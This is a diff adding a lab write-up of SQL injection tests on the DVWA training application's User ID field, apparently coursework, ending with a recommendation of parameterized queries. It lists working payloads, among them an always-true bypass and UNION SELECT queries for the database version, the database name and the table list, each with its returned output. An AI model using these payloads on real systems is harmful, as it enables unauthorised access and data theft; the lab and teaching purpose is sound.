@@ -1,3 +1,70 @@
+//1. Exploit Phase
+SQL Injection Testing Results
+Environment: DVWA – SQL Injection (User ID Input Field)
+
+During testing of the User ID input field, multiple SQL injection payloads were entered to determine whether user input was being safely handled or directly concatenated into database queries. The following payloads successfully executed, confirming that the application is vulnerable to SQL injection.
+
+Test 1 – Authentication bypass using always-true condition
+Payload:
+' OR '1'='1
+
+Result:
+ID: 1 OR 1=1
+First name: admin
+Surname: admin
+
+This payload forced the WHERE clause to evaluate as true, which returned the admin account and bypassed normal query filtering.
+
+Test 2 – Numeric always-true condition
+Payload:
+1 OR 1=1
+
+Result:
+ID: 1 OR 1=1
+First name: admin
+Surname: admin
+
+This produced the same result as the previous test. Because 1=1 is always true, the database returned the first available user record.
+
+Test 3 – Database version disclosure
+Payload:
+' UNION SELECT 1,version() --
+
+Result:
+ID: ' UNION SELECT 1,version() --
+First name: 1
+Surname: 11.8.3-MariaDB-1+b1 from Debian
+
+This UNION query successfully retrieved the database server version, demonstrating that arbitrary data can be extracted from the system.
+
+Test 4 – Database name disclosure
+Payload:
+' UNION SELECT 1,database() --
+
+Result:
+ID: ' UNION SELECT 1,database() --
+First name: 1
+
+This query returned the current database name, confirming further information disclosure.
+
+Test 5 – Table enumeration
+Payload:
+' UNION SELECT 1,table_name FROM information_schema.tables --
+
+Result:
+ID: ' UNION SELECT 1,table_name FROM information_schema.tables --
+First name: 1
+Surname: ALL_PLUGINS
+
+This query enumerated table names from the information schema, demonstrating that database structure information can be accessed.
+
+Summary:
+The User ID input field is vulnerable to SQL injection. Multiple payloads allowed authentication bypass, database version disclosure, database identification, and table enumeration. These results indicate that user input is being directly inserted into SQL statements without proper validation or parameterization. The issue can be mitigated by using parameterized queries or prepared statements to ensure user input is treated strictly as data rather than executable SQL.
+
+
+
+
+
 
 //2. Remediation Phase
 //language C#
